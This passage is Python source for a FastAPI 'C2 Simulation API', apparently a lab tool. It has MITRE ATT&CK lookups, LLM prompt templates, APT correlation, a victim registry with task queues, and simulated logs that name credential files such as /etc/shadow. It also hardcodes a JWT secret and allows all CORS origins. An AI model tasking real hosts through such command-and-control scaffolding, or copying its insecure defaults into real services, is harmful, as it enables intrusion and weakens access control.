# =============================================================================
#  main.py  —  C2 Simulation API v3.1
#  Groq AI  |  MITRE ATT&CK  |  APT Correlation  |  ATT&CK Navigator
#  + Dynamic Victim Management (IP / URL / hostname)
# =============================================================================

from fastapi import FastAPI, HTTPException, Depends
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import OAuth2PasswordBearer, OAuth2PasswordRequestForm
from fastapi.responses import StreamingResponse
from jose import JWTError, jwt
from datetime import datetime, timedelta
import os
import database
import logging
from typing import Optional, Dict, List, Any
import requests
import json
import httpx
import asyncio
import collections
import threading
import random
import psutil
import re
from urllib.parse import urlparse

# ── Logging ───────────────────────────────────────────────────────────────────
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ── Groq config ───────────────────────────────────────────────────────────────
GROQ_API_KEY = os.environ.get("GROQ_API_KEY")
GROQ_MODEL   = os.environ.get("GROQ_MODEL", "llama-3.3-70b-versatile")
GROQ_URL     = "https://api.groq.com/openai/v1/chat/completions"

# ── Navigator auto-save path ──────────────────────────────────────────────────
NAVIGATOR_LAYER_PATH = "/opt/attack-navigator/nav-app/src/assets/layers/c2_live.json"

# ── JWT settings ──────────────────────────────────────────────────────────────
SECRET_KEY                  = "super-secret-key-change-this-in-production"
ALGORITHM                   = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 30

# ── FastAPI app ───────────────────────────────────────────────────────────────
app = FastAPI(
    title="C2 Simulation API",
    description="C2 simulation with MITRE ATT&CK, Groq AI, APT correlation, and Dynamic Victim Management",
    version="3.1.0",
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token")

# =============================================================================
#  AI PROMPT TEMPLATES
# =============================================================================
PROMPT_TEMPLATES: Dict[str, str] = {
    "explain_technique": (
        "You are a professional cybersecurity analyst and threat intelligence expert.\n"
        "Analyze MITRE ATT&CK Technique **{technique_id}** and provide a structured, expert-level breakdown.\n"
        "---\n"
        "**Technique Name:** {technique_name}\n"
        "**Tactics:** {tactics}\n"
        "**Platforms:** {platforms}\n"
        "**Official Description:** {description}\n"
        "---\n"
        "## 1. Overview\n"
        "Explain what this technique does in clear, technical terms.\n"
        "## 2. Attacker Motivation\n"
        "Why do adversaries use this technique?\n"
        "## 3. Real-World Usage\n"
        "Known threat actors or malware families that use this technique.\n"
        "## 4. Detection Strategy\n"
        "Key IOCs, log sources, event IDs, and behavioral patterns.\n"
        "## 5. Mitigation & Hardening\n"
        "Specific configuration changes and security controls.\n"
        "## 6. Analyst Notes\n"
        "Additional context and tips for defenders.\n"
        "Be precise, professional, and actionable."
    ),
    "analyze_output": (
        "You are a senior red team analyst reviewing command output from a compromised system.\n"
        "**Technique Used:** {technique_id} - {technique_name}\n"
        "**Command Executed:** `{command}`\n"
        "**Raw Output:**\n```\n{output}\n```\n"
        "## 1. Key Findings\n"
        "What sensitive or notable information is revealed?\n"
        "## 2. Risk Assessment\n"
        "Rate the severity (Critical / High / Medium / Low) and explain why.\n"
        "## 3. Attack Path Implications\n"
        "How could this enable lateral movement, privilege escalation, or persistence?\n"
        "## 4. Immediate Defender Actions\n"
        "What should the blue team do immediately?\n"
        "Be concise, precise, and actionable."
    ),
    "threat_hunt": (
        "You are a threat hunting expert. Based on the MITRE techniques observed, "
        "generate a threat hunting hypothesis and investigation plan.\n"
        "**Observed Techniques:**\n{techniques_list}\n"
        "**Timeframe:** {timeframe}\n"
        "## 1. Threat Actor Profile\n"
        "What type of adversary does this pattern suggest?\n"
        "## 2. Kill Chain Mapping\n"
        "Map techniques to MITRE ATT&CK kill chain stages.\n"
        "## 3. Hunting Hypotheses\n"
        "List 3-5 specific hypotheses to investigate.\n"
        "## 4. Data Sources to Query\n"
        "Specify logs, tools, and queries per hypothesis.\n"
        "## 5. Priority Actions\n"
        "Order investigation steps by priority."
    ),
}

# =============================================================================
#  GROQ AI CLIENT
# =============================================================================
class GroqClient:
    def __init__(self):
        self.api_key = GROQ_API_KEY
        self.model   = GROQ_MODEL
        self.url     = GROQ_URL
        self.timeout = httpx.Timeout(timeout=60.0)

    def is_available(self) -> bool:
        return self.api_key is not None

    async def health_check(self) -> bool:
        return self.is_available()

    async def generate(
        self,
        prompt: str,
        system: str = None,
        temperature: float = 0.7,
        max_tokens: int = 300,
    ) -> str:
        if not self.is_available():
            raise HTTPException(status_code=503, detail="Groq API key not configured")
        headers  = {"Authorization": f"Bearer {self.api_key}", "Content-Type": "application/json"}
        messages = []
        if system:
            messages.append({"role": "system", "content": system})
        messages.append({"role": "user", "content": prompt})
        payload = {
            "model":       self.model,
            "messages":    messages,
            "temperature": temperature,
            "max_tokens":  max_tokens,
        }
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            response = await client.post(self.url, headers=headers, json=payload)
            response.raise_for_status()
        return response.json()["choices"][0]["message"]["content"].strip()

    async def chat(
        self,
        messages: List[Dict],
        temperature: float = 0.7,
        max_tokens: int = 200,
    ) -> str:
        if not self.is_available():
            raise HTTPException(status_code=503, detail="Groq API key not configured")
        headers = {"Authorization": f"Bearer {self.api_key}", "Content-Type": "application/json"}
        payload = {
            "model":       self.model,
            "messages":    messages,
            "temperature": temperature,
            "max_tokens":  max_tokens,
        }
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            response = await client.post(self.url, headers=headers, json=payload)
            response.raise_for_status()
        return response.json()["choices"][0]["message"]["content"].strip()

    async def generate_stream(
        self,
        prompt: str,
        system: str = None,
        temperature: float = 0.7,
        max_tokens: int = 300,
    ):
        if not self.is_available():
            yield "data: {\"error\": \"Groq API key not configured\"}\n\n"
            return
        headers  = {"Authorization": f"Bearer {self.api_key}", "Content-Type": "application/json"}
        messages = []
        if system:
            messages.append({"role": "system", "content": system})
        messages.append({"role": "user", "content": prompt})
        payload = {
            "model":       self.model,
            "messages":    messages,
            "temperature": temperature,
            "max_tokens":  max_tokens,
            "stream":      True,
        }
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            async with client.stream("POST", self.url, headers=headers, json=payload) as resp:
                async for line in resp.aiter_lines():
                    if not line:
                        continue
                    if line.startswith("data:"):
                        if line.strip() == "data: [DONE]":
                            yield "data: [DONE]\n\n"
                            break
                        try:
                            data  = json.loads(line[5:])
                            token = data["choices"][0]["delta"].get("content", "")
                            if token:
                                yield f"data: {json.dumps({'token': token})}\n\n"
                        except Exception:
                            continue


ai = GroqClient()

# =============================================================================
#  MITRE ATT&CK  —  local fallback cache
# =============================================================================
MITRE_LOCAL_CACHE: Dict[str, Any] = {
    "T1003": {
        "name": "OS Credential Dumping",
        "description": "Adversaries may attempt to dump credentials to obtain account login and credential material.",
        "tactics": ["credential-access"],
        "platforms": ["Windows", "Linux", "macOS"],
        "detection": "Monitor for access to sensitive credential files such as /etc/shadow.",
        "data_sources": ["File monitoring", "Process monitoring"],
        "permissions_required": ["Administrator"],
    },
    "T1016": {
        "name": "System Network Configuration Discovery",
        "description": "Adversaries may look for details about the network configuration and settings.",
        "tactics": ["discovery"],
        "platforms": ["Windows", "Linux", "macOS"],
        "detection": "Monitor for commands that gather network configuration information.",
        "data_sources": ["Process monitoring", "Command-line monitoring"],
        "permissions_required": ["User"],
    },
    "T1027": {
        "name": "Obfuscated Files or Information",
        "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze.",
        "tactics": ["defense-evasion"],
        "platforms": ["Windows", "Linux", "macOS"],
        "detection": "Monitor for suspicious encoded or encrypted payloads.",
        "data_sources": ["File monitoring", "Process monitoring"],
        "permissions_required": ["User"],
    },
    "T1033": {
        "name": "System Owner/User Discovery",
        "description": "Adversaries may attempt to identify the primary user, currently logged in user, or set of users.",
        "tactics": ["discovery"],
        "platforms": ["Windows", "Linux", "macOS"],
        "detection": "Monitor for whoami and similar commands.",
        "data_sources": ["Process monitoring", "Command-line monitoring"],
        "permissions_required": ["User"],
    },
    "T1036": {
        "name": "Masquerading",
        "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate.",
        "tactics": ["defense-evasion"],
        "platforms": ["Windows", "Linux", "macOS"],
        "detection": "Monitor for renamed system utilities or unexpected process names.",
        "data_sources": ["File monitoring", "Process monitoring"],
        "permissions_required": ["User"],
    },
    "T1046": {
        "name": "Network Service Scanning",
        "description": "Adversaries may attempt to get a listing of services running on remote hosts.",
        "tactics": ["discovery"],
        "platforms": ["Windows", "Linux", "macOS"],
        "detection": "Monitor for network scanning activity.",
        "data_sources": ["Network monitoring", "Process monitoring"],
        "permissions_required": ["User"],
    },
    "T1053": {
        "name": "Scheduled Task/Job",
        "description": "Adversaries may abuse task scheduling to facilitate initial or recurring execution of malicious code.",
        "tactics": ["execution", "persistence", "privilege-escalation"],
        "platforms": ["Windows", "Linux", "macOS"],
        "detection": "Monitor scheduled task creation and modification events.",
        "data_sources": ["File monitoring", "Process monitoring", "Windows event logs"],
        "permissions_required": ["Administrator", "User"],
    },
    "T1053.001": {
        "name": "At (Linux)",
        "description": "Adversaries may use the at utility to schedule task execution on Linux systems.",
        "tactics": ["execution", "persistence"],
        "platforms": ["Linux"],
        "detection": "Monitor at job creation in /var/spool/cron/atjobs.",
        "data_sources": ["File monitoring", "Process monitoring"],
        "permissions_required": ["User"],
    },
    "T1053.003": {
        "name": "Cron",
        "description": "Adversaries may use cron to schedule task execution on Linux and Unix systems.",
        "tactics": ["execution", "persistence"],
        "platforms": ["Linux", "macOS"],
        "detection": "Monitor cron job creation in /etc/crontab and /etc/cron.*/ directories.",
        "data_sources": ["File monitoring", "Process monitoring"],
        "permissions_required": ["User", "Administrator"],
    },
    "T1057": {
        "name": "Process Discovery",
        "description": "Adversaries may attempt to get information about running processes on a system.",
        "tactics": ["discovery"],
        "platforms": ["Windows", "Linux", "macOS"],
        "detection": "Monitor for command-line arguments that query process information.",
        "data_sources": ["Process monitoring", "Command-line monitoring"],
        "permissions_required": ["User"],
    },
    "T1062": {
        "name": "Hypervisor",
        "description": "Adversaries may leverage a virtual machine to evade defenses.",
        "tactics": ["persistence"],
        "platforms": ["Windows"],
        "detection": "Monitor for hypervisor-related artifacts.",
        "data_sources": ["System monitoring"],
        "permissions_required": ["Administrator"],
    },
    "T1068": {
        "name": "Exploitation for Privilege Escalation",
        "description": "Adversaries may exploit software vulnerabilities to elevate privileges.",
        "tactics": ["privilege-escalation"],
        "platforms": ["Windows", "Linux", "macOS"],
        "detection": "Monitor for unexpected process privilege changes.",
        "data_sources": ["Process monitoring"],
        "permissions_required": ["User"],
    },
    "T1070": {
        "name": "Indicator Removal on Host",
        "description": "Adversaries may delete or alter generated artifacts to remove evidence of their presence.",
        "tactics": ["defense-evasion"],
        "platforms": ["Windows", "Linux", "macOS"],
        "detection": "Monitor for log clearing and history deletion.",
        "data_sources": ["File monitoring", "Process monitoring"],
        "permissions_required": ["User", "Administrator"],
    },
    "T1082": {
        "name": "System Information Discovery",
        "description": "An adversary may attempt to get detailed information about the operating system and hardware.",
        "tactics": ["discovery"],
        "platforms": ["Windows", "Linux", "macOS"],
        "detection": "Monitor for commands that gather system information.",
        "data_sources": ["Process monitoring", "Command-line monitoring"],
        "permissions_required": ["User"],
    },
    "T1083": {
        "name": "File and Directory Discovery",
        "description": "Adversaries may enumerate files and directories to find sensitive data.",
        "tactics": ["discovery"],
        "platforms": ["Windows", "Linux", "macOS"],
        "detection": "Monitor for file and directory enumeration commands.",
        "data_sources": ["File monitoring", "Process monitoring"],
        "permissions_required": ["User"],
    },
    "T1087": {
        "name": "Account Discovery",
        "description": "Adversaries may attempt to get a listing of accounts on a system.",
        "tactics": ["discovery"],
        "platforms": ["Windows", "Linux", "macOS"],
        "detection": "Monitor for commands that list user accounts.",
        "data_sources": ["Process monitoring", "Command-line monitoring"],
        "permissions_required": ["User"],
    },
    "T1098": {
        "name": "Account Manipulation",
        "description": "Adversaries may manipulate accounts to maintain access to victim systems.",
        "tactics": ["persistence"],
        "platforms": ["Windows", "Linux", "macOS"],
        "detection": "Monitor for changes to account objects.",
        "data_sources": ["Process monitoring", "Windows event logs"],
        "permissions_required": ["Administrator"],
    },
    "T1105": {
        "name": "Ingress Tool Transfer",
        "description": "Adversaries may transfer tools or other files from an external system into a compromised environment.",
        "tactics": ["command-and-control"],
        "platforms": ["Windows", "Linux", "macOS"],
        "detection": "Monitor network traffic for file transfer activity.",
        "data_sources": ["Network monitoring", "Process monitoring"],
        "permissions_required": ["User"],
    },
    "T1110": {
        "name": "Brute Force",
        "description": "Adversaries may use brute force techniques to gain access to accounts.",
        "tactics": ["credential-access"],
        "platforms": ["Windows", "Linux", "macOS"],
        "detection": "Monitor for repeated failed login attempts.",
        "data_sources": ["Authentication logs"],
        "permissions_required": ["User"],
    },
    "T1222": {
        "name": "File and Directory Permissions Modification",
        "description": "Adversaries may modify file permissions to evade access controls.",
        "tactics": ["defense-evasion"],
        "platforms": ["Windows", "Linux", "macOS"],
        "detection": "Monitor for permission change commands such as chmod.",
        "data_sources": ["File monitoring", "Process monitoring"],
        "permissions_required": ["User", "Administrator"],
    },
    "T1505": {
        "name": "Server Software Component",
        "description": "Adversaries may abuse legitimate extensible development features of servers to establish persistent access.",
        "tactics": ["persistence"],
        "platforms": ["Windows", "Linux", "macOS"],
        "detection": "Monitor for unexpected web server file changes.",
        "data_sources": ["File monitoring", "Process monitoring"],
        "permissions_required": ["Administrator"],
    },
    "T1518": {
        "name": "Software Discovery",
        "description": "Adversaries may attempt to get a listing of software installed on a system.",
        "tactics": ["discovery"],
        "platforms": ["Windows", "Linux", "macOS"],
        "detection": "Monitor for commands that enumerate installed software.",
        "data_sources": ["Process monitoring", "Command-line monitoring"],
        "permissions_required": ["User"],
    },
    "T1547": {
        "name": "Boot or Logon Autostart Execution",
        "description": "Adversaries may configure system settings to execute a program during system boot or logon.",
        "tactics": ["persistence", "privilege-escalation"],
        "platforms": ["Windows", "Linux", "macOS"],
        "detection": "Monitor autostart locations for unexpected entries.",
        "data_sources": ["File monitoring", "Windows registry"],
        "permissions_required": ["User", "Administrator"],
    },
    "T1548": {
        "name": "Abuse Elevation Control Mechanism",
        "description": "Adversaries may bypass UAC or sudo to elevate privileges.",
        "tactics": ["privilege-escalation", "defense-evasion"],
        "platforms": ["Windows", "Linux", "macOS"],
        "detection": "Monitor for sudo usage and UAC bypass attempts.",
        "data_sources": ["Process monitoring", "Command-line monitoring"],
        "permissions_required": ["User"],
    },
    "T1552": {
        "name": "Unsecured Credentials",
        "description": "Adversaries may search compromised systems for insecurely stored credentials.",
        "tactics": ["credential-access"],
        "platforms": ["Windows", "Linux", "macOS"],
        "detection": "Monitor access to configuration files that may contain credentials.",
        "data_sources": ["File monitoring", "Command-line monitoring"],
        "permissions_required": ["User"],
    },
    "T1555": {
        "name": "Credentials from Password Stores",
        "description": "Adversaries may search for common password storage locations to obtain credentials.",
        "tactics": ["credential-access"],
        "platforms": ["Windows", "Linux", "macOS"],
        "detection": "Monitor for access to password store files and keychain access.",
        "data_sources": ["File monitoring", "Process monitoring"],
        "permissions_required": ["User"],
    },
    "T1562": {
        "name": "Impair Defenses",
        "description": "Adversaries may maliciously modify components of a system to impair defensive tools.",
        "tactics": ["defense-evasion"],
        "platforms": ["Windows", "Linux", "macOS"],
        "detection": "Monitor for modifications to security tool configuration.",
        "data_sources": ["Process monitoring", "Windows event logs"],
        "permissions_required": ["User", "Administrator"],
    },
}

# =============================================================================
#  MITRE ATT&CK API CLASS
# =============================================================================
class MitreAttackAPI:
    def __init__(self):
        self.techniques:         Optional[List]    = None
        self.techniques_dict:    Dict[str, Any]    = {}
        self.using_local_cache:  bool              = False
        self.github_url  = "https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json"
        self.cache_file  = "/tmp/mitre_attack_cache.json"

    def _parse_stix(self, data: dict):
        self.techniques      = data.get("objects", [])
        self.techniques_dict = {}
        for obj in self.techniques:
            if obj.get("type") == "attack-pattern":
                for ref in obj.get("external_references", []):
                    if ref.get("source_name") == "mitre-attack":
                        ext_id = ref.get("external_id")
                        if ext_id:
                            self.techniques_dict[ext_id] = obj
                            break

    def load_data(self) -> bool:
        try:
            logger.info("Loading MITRE data from GitHub...")
            resp = requests.get(self.github_url, timeout=30)
            resp.raise_for_status()
            data = resp.json()
            self._parse_stix(data)
            logger.info(f"MITRE: loaded {len(self.techniques_dict)} techniques from GitHub")
            self.using_local_cache = False
            try:
                with open(self.cache_file, "w") as f:
                    json.dump(data, f)
            except Exception:
                pass
            return True
        except requests.exceptions.Timeout:
            logger.warning("MITRE GitHub: connection timed out")
        except requests.exceptions.ConnectionError:
            logger.warning("MITRE GitHub: network connection error")
        except Exception as e:
            logger.warning(f"MITRE GitHub: request failed — {e}")

        try:
            if os.path.exists(self.cache_file):
                logger.info("Loading MITRE data from disk cache")
                with open(self.cache_file, "r") as f:
                    data = json.load(f)
                self._parse_stix(data)
                logger.info(f"MITRE: loaded {len(self.techniques_dict)} techniques from disk cache")
                self.using_local_cache = False
                return True
        except Exception as e:
            logger.warning(f"MITRE disk cache: {e}")

        logger.info("MITRE: using built-in local cache")
        self.using_local_cache = True
        self.techniques = []
        return True

    def get_technique(self, technique_code: str) -> Optional[Dict[str, Any]]:
        code = technique_code.upper()
        if not self.using_local_cache and self.techniques_dict:
            if code in self.techniques_dict:
                return self.techniques_dict[code]
            if "." in code:
                parent = code.split(".")[0]
                if parent in self.techniques_dict:
                    return self.techniques_dict[parent]
        if code in MITRE_LOCAL_CACHE:
            entry = MITRE_LOCAL_CACHE[code].copy()
            entry["external_id"] = code
            return entry
        if "." in code:
            parent = code.split(".")[0]
            if parent in MITRE_LOCAL_CACHE:
                entry = MITRE_LOCAL_CACHE[parent].copy()
                entry["external_id"]      = code
                entry["is_subtechnique"]  = True
                entry["parent_technique"] = parent
                return entry
        return None

    def format_technique_response(
        self, technique: Dict[str, Any], requested_code: str = None
    ) -> Dict[str, Any]:
        if self.using_local_cache or "external_id" in technique:
            return technique
        technique_id = requested_code or "Unknown"
        for ref in technique.get("external_references", []):
            if ref.get("source_name") == "mitre-attack":
                technique_id = ref.get("external_id", technique_id)
                break
        tactics = [
            phase.get("phase_name", "").replace("mitre-attack-", "")
            for phase in technique.get("kill_chain_phases", [])
        ]
        return {
            "technique_id":         technique_id,
            "technique_name":       technique.get("name"),
            "description":          technique.get("description"),
            "tactics":              tactics,
            "platforms":            technique.get("x_mitre_platforms", []),
            "detection":            technique.get("x_mitre_detection"),
            "data_sources":         technique.get("x_mitre_data_sources", []),
            "permissions_required": technique.get("x_mitre_permissions_required", []),
        }

    def search_techniques(self, search_term: str) -> List[Dict[str, Any]]:
        term    = search_term.lower()
        results = []
        if not self.using_local_cache and self.techniques_dict:
            for tech_id, obj in self.techniques_dict.items():
                if term in obj.get("name", "").lower() or term in (obj.get("description") or "").lower():
                    results.append({
                        "technique_id": tech_id,
                        "name":         obj.get("name"),
                        "description":  (obj.get("description") or "")[:200] + "...",
                    })
        for code, data in MITRE_LOCAL_CACHE.items():
            if term in data.get("name", "").lower() or term in data.get("description", "").lower():
                if not any(r["technique_id"] == code for r in results):
                    results.append({
                        "technique_id": code,
                        "name":         data.get("name"),
                        "description":  (data.get("description") or "")[:200] + "...",
                    })
        return results[:20]

    def get_statistics(self) -> Dict[str, Any]:
        if self.using_local_cache:
            return {
                "source":          "local_cache",
                "technique_count": len(MITRE_LOCAL_CACHE),
                "techniques":      list(MITRE_LOCAL_CACHE.keys()),
            }
        tactics_count: Dict[str, int] = {}
        for obj in self.techniques_dict.values():
            for phase in obj.get("kill_chain_phases", []):
                tactic = phase.get("phase_name", "").replace("mitre-attack-", "")
                tactics_count[tactic] = tactics_count.get(tactic, 0) + 1
        return {
            "source":            "github_stix",
            "technique_count":   len(self.techniques_dict),
            "tactics_count":     len(tactics_count),
            "tactics_breakdown": tactics_count,
        }


mitre = MitreAttackAPI()

# =============================================================================
#  APT CORRELATOR
# =============================================================================
class APTCorrelator:
    def __init__(self):
        self.groups: Dict[str, Dict] = {}
        self.loaded: bool            = False
        self._lock                   = threading.Lock()

    def load_from_stix(self, stix_objects: List[Dict]) -> int:
        if not stix_objects:
            return 0
        tech_id_map: Dict[str, str] = {}
        for obj in stix_objects:
            if obj.get("type") == "attack-pattern":
                stix_id = obj.get("id", "")
                for ref in obj.get("external_references", []):
                    if ref.get("source_name") == "mitre-attack":
                        tech_id_map[stix_id] = ref["external_id"]
                        break
        raw_groups: Dict[str, Dict] = {}
        for obj in stix_objects:
            if obj.get("type") == "intrusion-set":
                gid    = obj.get("id", "")
                name   = obj.get("name", "Unknown")
                ext_id = ""
                for ref in obj.get("external_references", []):
                    if ref.get("source_name") == "mitre-attack":
                        ext_id = ref.get("external_id", "")
                        break
                raw_groups[gid] = {
                    "stix_id":     gid,
                    "group_id":    ext_id,
                    "name":        name,
                    "aliases":     obj.get("aliases", [name]),
                    "techniques":  set(),
                    "description": obj.get("description", ""),
                }
        for obj in stix_objects:
            if obj.get("type") == "relationship" and obj.get("relationship_type") == "uses":
                src = obj.get("source_ref", "")
                tgt = obj.get("target_ref", "")
                if src in raw_groups and tgt in tech_id_map:
                    raw_groups[src]["techniques"].add(tech_id_map[tgt])
        with self._lock:
            self.groups = {}
            for g in raw_groups.values():
                if g["techniques"]:
                    g["techniques"] = list(g["techniques"])
                    self.groups[g["name"]] = g
            self.loaded = True
        logger.info(f"APTCorrelator: loaded {len(self.groups)} groups")
        return len(self.groups)

    def correlate(self, executed: List[str]) -> List[Dict]:
        if not executed:
            return []
        executed_set = {t.upper() for t in executed}
        executed_set |= {t.split(".")[0] for t in executed_set}
        results = []
        with self._lock:
            for group in self.groups.values():
                group_techs = set(group["techniques"])
                matched     = executed_set & group_techs
                if not matched:
                    continue
                total = len(group_techs)
                results.append({
                    "name":               group["name"],
                    "group_id":           group["group_id"],
                    "aliases":            group["aliases"],
                    "overlap_count":      len(matched),
                    "group_total":        total,
                    "score_pct":          round(len(matched) / total * 100, 1),
                    "matched_techniques": sorted(matched),
                    "description":        (group.get("description") or "")[:300],
                })
        results.sort(key=lambda x: (x["overlap_count"], x["score_pct"]), reverse=True)
        return results


apt_correlator = APTCorrelator()

# =============================================================================
#  EXECUTED TECHNIQUES STORE
# =============================================================================
EXECUTED_TECHNIQUES: Dict[str, Dict] = {}
EXECUTED_LOCK = threading.Lock()


def record_executed_technique(technique_id: str, output: str = "", host: str = ""):
    tid = technique_id.upper().strip()
    ts  = datetime.utcnow().isoformat() + "Z"
    with EXECUTED_LOCK:
        if tid not in EXECUTED_TECHNIQUES:
            EXECUTED_TECHNIQUES[tid] = {
                "technique_id": tid,
                "first_seen":   ts,
                "last_seen":    ts,
                "count":        0,
                "hosts":        set(),
                "outputs":      [],
            }
        entry = EXECUTED_TECHNIQUES[tid]
        entry["count"]    += 1
        entry["last_seen"] = ts
        entry["hosts"].add(host)
        if output:
            entry["outputs"].append({"ts": ts, "snippet": output[:300]})

# =============================================================================
#  NAVIGATOR LAYER BUILDER
# =============================================================================
def build_navigator_layer(
    executed: Dict[str, Dict],
    layer_name:  str = "C2 Simulation — Executed Techniques",
    description: str = "Auto-generated from live C2 session",
) -> Dict:
    COLOR_SCALE = ["#ffffb2", "#fecc5c", "#fd8d3c", "#f03b20", "#bd0026"]

    def pick_color(count: int) -> str:
        return COLOR_SCALE[min(count - 1, len(COLOR_SCALE) - 1)]

    with EXECUTED_LOCK:
        items = list(executed.items())

    technique_entries = []
    for tid, info in items:
        hosts_list = list(info["hosts"]) if isinstance(info["hosts"], set) else info["hosts"]
        technique_entries.append({
            "techniqueID":       tid,
            "score":             info["count"],
            "color":             pick_color(info["count"]),
            "comment": (
                f"Executed {info['count']} time(s). "
                f"First: {info['first_seen']}. "
                f"Last: {info['last_seen']}. "
                f"Hosts: {', '.join(hosts_list) or 'unknown'}."
            ),
            "enabled":           True,
            "showSubtechniques": True,
        })

    max_score = max((info["count"] for _, info in items), default=1)

    return {
        "name":        layer_name,
        "versions":    {"attack": "14", "navigator": "4.9", "layer": "4.5"},
        "domain":      "enterprise-attack",
        "description": description,
        "filters":     {"platforms": ["Linux", "macOS", "Windows", "Network", "PRE", "Containers"]},
        "sorting":     3,
        "layout": {
            "layout":              "side",
            "aggregateFunction":   "max",
            "showID":              True,
            "showName":            True,
            "showAggregateScores": True,
            "countUnscored":       False,
        },
        "hideDisabled": False,
        "techniques":   technique_entries,
        "gradient":     {"colors": ["#ffffb2", "#bd0026"], "minValue": 1, "maxValue": max_score},
        "legendItems": [
            {"label": "Executed once",      "color": "#ffffb2"},
            {"label": "Executed 2-3 times", "color": "#fd8d3c"},
            {"label": "Executed 5+ times",  "color": "#bd0026"},
        ],
        "metadata":                      [],
        "links":                         [],
        "showTacticRowBackground":       True,
        "tacticRowBackground":           "#dddddd",
        "selectTechniquesAcrossTactics": True,
        "selectSubtechniquesWithParent": False,
        "selectVisibleTechniques":       False,
    }

# =============================================================================
#  GLOBAL STATE  —  task / output queues, agents
# =============================================================================
TASK_QUEUE:   Dict[str, List] = {}
OUTPUT_QUEUE: Dict[str, List] = {}
AGENTS:       Dict[str, Dict] = {}
VICTIM_NAME   = "websecsim-victim-c2"   # kept for backwards-compatibility

# =============================================================================
#  ── NEW ──  DYNAMIC VICTIM REGISTRY
# =============================================================================
DEFAULT_VICTIM = VICTIM_NAME            # original default still works

VICTIM_REGISTRY: Dict[str, Dict] = {}  # victim_id → metadata
VICTIM_LOCK     = threading.Lock()


def normalize_victim_id(target: str) -> str:
    """
    Convert any IP, hostname, or URL into a safe, stable victim ID string.
      http://192.168.1.10:8080/path  →  192.168.1.10
      https://target.lab/           →  target.lab
      192.168.1.50                  →  192.168.1.50
      my-host_01                    →  my-host_01
    """
    target = target.strip()
    parsed = urlparse(target)
    if parsed.scheme in ("http", "https") and parsed.hostname:
        return parsed.hostname
    # Strip any stray characters that would break dict keys / logs
    return re.sub(r"[^\w\.\-]", "_", target)


def validate_victim_target(target: str) -> bool:
    """Accept IPv4 addresses, plain hostnames/domains, or http(s) URLs."""
    ip_pat     = re.compile(r"^\d{1,3}(\.\d{1,3}){3}$")
    domain_pat = re.compile(r"^[a-zA-Z0-9\.\-]+$")
    url_pat    = re.compile(r"^https?://[^\s]+$")
    return bool(ip_pat.match(target) or domain_pat.match(target) or url_pat.match(target))


def register_victim(victim_id: str, label: str = "", source: str = "manual") -> Dict:
    """
    Idempotent — creates a new victim record or returns/updates the existing one.
    source: 'manual' | 'beacon' | 'auto'
    """
    with VICTIM_LOCK:
        if victim_id not in VICTIM_REGISTRY:
            VICTIM_REGISTRY[victim_id] = {
                "victim_id":  victim_id,
                "label":      label or victim_id,
                "source":     source,
                "added_at":   datetime.utcnow().isoformat() + "Z",
                "last_seen":  None,
                "active":     True,
                "tags":       [],
                "notes":      "",
            }
        else:
            VICTIM_REGISTRY[victim_id]["active"] = True
            if label:
                VICTIM_REGISTRY[victim_id]["label"] = label
        return VICTIM_REGISTRY[victim_id]


def _ensure_victim_queues(victim_id: str):
    """Make sure TASK_QUEUE and OUTPUT_QUEUE entries exist for victim_id."""
    if victim_id not in TASK_QUEUE:
        TASK_QUEUE[victim_id] = []
    if victim_id not in OUTPUT_QUEUE:
        OUTPUT_QUEUE[victim_id] = []


# ── Pre-register the default / legacy victim so it always appears in the list ─
register_victim(DEFAULT_VICTIM, label="Default Simulation Victim", source="builtin")

# =============================================================================
#  LIVE LOG STORE
# =============================================================================
LOG_STORE: collections.deque = collections.deque(maxlen=500)
LOG_LOCK  = threading.Lock()


def push_log(category: str, level: str, source: str, message: str, details: dict = None):
    with LOG_LOCK:
        entry = {
            "id":       len(LOG_STORE),
            "ts":       datetime.utcnow().isoformat() + "Z",
            "category": category,
            "level":    level,
            "source":   source,
            "msg":      message,
            "details":  details or {},
        }
        LOG_STORE.append(entry)


# Simulation data pools
_FAKE_IPS     = ["185.220.101.47", "45.142.212.100", "198.51.100.23", "203.0.113.77", "91.108.4.1"]
_INTERNAL_IPS = ["10.0.0.1", "10.0.0.2", "192.168.1.1", "172.16.0.5"]
_AUTH_USERS   = ["root", "admin", "ubuntu", "pi", "guest", "operator"]
_FILE_PATHS   = [
    "/etc/passwd", "/etc/shadow", "/root/.ssh/authorized_keys",
    "/tmp/.hidden", "/proc/self/mem", "/var/log/auth.log",
    "/home/user/.bash_history", "/etc/crontab",
]


async def _log_system_metrics():
    while True:
        try:
            cpu = psutil.cpu_percent(interval=1)
            mem = psutil.virtual_memory()
            procs = [(p.pid, p.name()) for p in psutil.process_iter(["pid", "name"])][:8]
            push_log(
                "system", "info", "sysmon",
                f"CPU {cpu:.1f}% | MEM {mem.percent:.1f}% ({mem.used//1024//1024}MB/{mem.total//1024//1024}MB)",
                {"cpu_pct": cpu, "mem_pct": mem.percent, "top_procs": procs},
            )
            if cpu > 75:
                push_log("system", "warn", "sysmon",
                         f"HIGH CPU: {cpu:.1f}% — possible crypto/scan activity",
                         {"cpu_pct": cpu})
        except Exception as e:
            push_log("system", "warn", "sysmon", f"Metrics error: {e}")
        await asyncio.sleep(10)


async def _log_security_events():
    while True:
        try:
            r = random.random()
            if r < 0.25:
                user = random.choice(_AUTH_USERS)
                ip   = random.choice(_FAKE_IPS + _INTERNAL_IPS)
                push_log("security", "warn", "auth",
                         f"Failed SSH login for '{user}' from {ip}",
                         {"user": user, "src_ip": ip, "service": "sshd", "port": 22})
            elif r < 0.40:
                uid = random.randint(1000, 1100)
                push_log("security", "alert", "sudo",
                         f"Privilege escalation: sudo by uid={uid}",
                         {"uid": uid, "cmd": random.choice(["sudo bash", "sudo su -"])})
            elif r < 0.50:
                push_log("security", "info", "auth",
                         f"Successful login: user='{random.choice(['admin','operator'])}' via ssh",
                         {"method": "publickey"})
            elif r < 0.55:
